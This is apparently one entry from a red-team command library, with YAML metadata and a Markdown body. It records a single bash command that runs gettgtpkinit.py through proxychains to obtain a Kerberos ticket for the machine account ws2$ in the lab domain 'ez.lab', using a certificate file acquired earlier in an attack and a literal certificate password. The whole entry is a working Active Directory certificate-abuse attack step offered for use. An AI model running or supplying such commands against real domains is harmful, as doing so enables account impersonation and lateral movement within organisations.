---
id: dde450b9-dbc1-45cc-97ae-abfa312dd808
name: Get a TGT using the newly acquired certificate via PKINIT
type: command
executor: bash
data: proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx
  -pfx-pass 5j6fNfnsU7BkTWQOJhpR
output: null
created_at: '2023-04-06T03:56:06.311008+00:00'
updated_at: '2023-04-10T20:26:05.079234+00:00'
---

# Get a TGT using the newly acquired certificate via PKINIT

```bash
proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
```


